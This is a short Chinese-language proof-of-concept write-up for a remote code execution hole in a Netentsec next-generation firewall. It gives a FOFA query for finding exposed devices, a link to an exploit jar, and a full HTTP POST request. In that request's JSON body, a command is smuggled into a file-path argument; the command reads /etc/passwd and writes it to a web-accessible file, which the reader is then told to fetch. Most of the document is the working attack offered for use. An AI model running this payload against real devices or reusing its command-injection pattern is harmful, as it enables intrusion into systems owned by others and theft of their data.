### 描述
fofa app="网康科技-下一代防火墙"

### 利用
利用jar包： `https://github.com/Yang0615777/PocList/blob/main/QiAnXin-WangKangFirewall-RCE.jar`

### POC
```
POST /directdata/direct/router HTTP/1.1
Host: x.x.x.x
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://x.x.x.x/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=d6o8gdugrhmvf2sq18ojhj50p3; ys-active_page=s%3A
Content-Length: 178

{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test_test.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
```
  
### 然后访问：/test_test.txt  
![640.png](https://i.loli.net/2021/04/12/OIqT4v26rbM5JhZ.png)
